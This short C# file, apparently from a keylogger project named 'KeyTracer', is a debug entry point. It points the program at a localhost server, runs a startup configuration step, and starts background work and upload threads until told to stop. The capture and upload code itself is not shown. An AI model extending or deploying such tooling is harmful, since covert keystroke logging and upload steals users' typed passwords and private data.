using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using System.Threading;

namespace KeyTracer
{
    static class Debug
    {
        public static int StartDebugging()
        {
            try
            {
                string server = "http://localhost:80/";

                Consts.Server = server;
                Consts.isConnected = true;

                StartUp.Configure();

                Thread uploadWork = new Thread(new ThreadStart(Threads.UplaodWork));
                uploadWork.Start();

                Thread work = new Thread(new ThreadStart(Threads.DoWork));
                work.Start();

                while (true)
                {
                    Thread.Sleep(Consts.matchDelayTime);

                    if (!Consts.doWork)
                    {
                        Threads.AbortThreads(work, uploadWork);
                    }
                }
               
                return 1;
            }
            catch
            {
                return 0;
            }
        }
    }
}
